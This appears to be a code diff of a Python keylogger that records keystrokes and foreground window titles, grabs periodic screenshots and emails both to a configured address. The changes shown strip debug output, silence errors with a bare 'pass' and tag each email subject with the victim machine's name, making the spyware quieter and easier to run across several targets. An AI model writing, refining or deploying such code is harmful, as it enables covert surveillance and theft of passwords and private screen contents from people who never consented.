@@ -4,7 +4,6 @@ import smtplib
 import time
 import os
 import threading
-import traceback
 import PIL.ImageGrab
 from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
@@ -25,7 +24,7 @@ def send_email():
             message = MIMEMultipart()
             message['From'] = CONFIG.email
             message['To'] = CONFIG.email
-            message['Subject'] = "Keylogger Status"
+            message['Subject'] = "Keylogger Status"+os.environ['COMPUTERNAME']
             image = PIL.ImageGrab.grab()
             image.save(CONFIG.Image)
             fp = open(CONFIG.Image, 'rb')
@@ -51,8 +50,7 @@ def send_email():
             os.remove(CONFIG.Image)
             DELETEFILE = True
         except:
-            traceback.print_exc()
-            print("Not DOne")
+            pass
         time.sleep(CONFIG.Interval)
 
 
@@ -60,17 +58,14 @@ def write_to_file(key):
     global DELETEFILE
     global CURRENT_WINDOW
     current = GetWindowText(GetForegroundWindow())
-    print(type(current))
     if(CURRENT_WINDOW != current):
         with open(CONFIG.File, 'a', encoding='utf-8') as f:
             f.write("\n")
             f.write(str(current))
             f.write("\n")
         CURRENT_WINDOW = current
-    print(CURRENT_WINDOW)
     letter = str(key)
     letter = letter.replace("'", "")
-    print(letter)
     if(DELETEFILE):
         with open(CONFIG.File, 'w') as f:
             f.write(letter)
